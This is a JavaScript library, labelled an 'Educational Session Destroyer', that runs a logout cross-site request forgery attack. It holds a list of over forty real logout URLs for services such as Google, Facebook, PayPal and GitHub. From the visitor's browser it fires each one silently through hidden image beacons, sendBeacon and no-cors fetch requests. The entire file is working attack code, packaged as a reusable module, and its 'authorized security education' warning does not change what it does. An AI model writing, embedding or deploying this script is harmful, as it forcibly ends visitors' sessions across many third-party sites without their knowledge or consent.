/**
 * index.js – Educational Session Destroyer (no iframes)
 * Uses image beacons, sendBeacon, and fetch to trigger logout URLs.
 * Much higher success rate than iframes.
 * 
 * WARNING: For authorized security education only.
 * Unauthorized use may violate laws.
 */

(function(global) {
    'use strict';

    // Expanded list of logout endpoints (45+)
    const LOGOUT_URLS = [
        "https://accounts.google.com/Logout",
        "https://mail.google.com/mail/?logout=true",
        "https://www.facebook.com/logout.php?confirm=1&buttonname=logout",
        "https://twitter.com/logout",
        "https://www.instagram.com/accounts/logout/",
        "https://login.live.com/logout.srf",
        "https://login.microsoftonline.com/logout",
        "https://www.amazon.com/ap/signout",
        "https://www.linkedin.com/uas/logout",
        "https://www.reddit.com/logout",
        "https://github.com/logout",
        "https://accounts.spotify.com/en/logout",
        "https://www.twitch.tv/logout",
        "https://www.paypal.com/logout",
        "https://signin.ebay.com/ws/eBayISAPI.dll?SignOut",
        "https://login.yahoo.com/config/login?logout=1",
        "https://www.netflix.com/Logout",
        "https://www.dropbox.com/logout",
        "https://www.pinterest.com/logout/",
        "https://www.icloud.com/logout",
        "https://appleid.apple.com/signout",
        "https://discord.com/logout",
        "https://stackoverflow.com/users/logout",
        "https://www.tumblr.com/logout",
        "https://www.flickr.com/signout",
        "https://account.adobe.com/logout",
        "https://slack.com/logout",
        "https://zoom.us/logout",
        "https://www.quora.com/logout",
        "https://medium.com/logout",
        "https://wordpress.com/logout",
        "https://id.atlassian.com/logout",
        "https://www.tiktok.com/logout",
        "https://accounts.snapchat.com/accounts/logout",
        "https://play.max.com/logout",
        "https://soundcloud.com/logout",
        "https://web.whatsapp.com/logout",
        "https://www.epicgames.com/id/logout",
        "https://steamcommunity.com/logout",
        "https://imgur.com/signout",
        "https://www.canva.com/logout",
        "https://www.deviantart.com/users/logout"
    ];

    // Send a single logout request using multiple redundant methods
    function fireLogoutRequest(url) {
        // Method 1: Image beacon (most reliable)
        const img = new Image();
        img.style.display = 'none';
        img.src = url;
        setTimeout(() => img.remove(), 1000);

        // Method 2: sendBeacon (works even after page close)
        if (navigator.sendBeacon) {
            navigator.sendBeacon(url);
        }

        // Method 3: fetch with no-cors & keepalive (broadcast)
        fetch(url, {
            method: 'GET',
            mode: 'no-cors',
            keepalive: true,
            cache: 'no-store'
        }).catch(() => {});
    }

    // Public API
    const index = {
        /**
         * Logs out from all services by firing requests to each logout URL.
         * Silent by default – no console spam.
         */
        async logoutFromEverything(options = { silent: true }) {
            if (!options.silent) console.log("[index] Firing logout requests...");
            for (const url of LOGOUT_URLS) {
                fireLogoutRequest(url);
                // Small delay to avoid overwhelming network/browser
                await new Promise(r => setTimeout(r, 15));
            }
            if (!options.silent) console.log("[index] Done – requests sent to", LOGOUT_URLS.length, "services");
        },

        /**
         * Returns the number of services targeted.
         */
        getTargetCount() {
            return LOGOUT_URLS.length;
        }
    };

    global.index = index;
})(window);
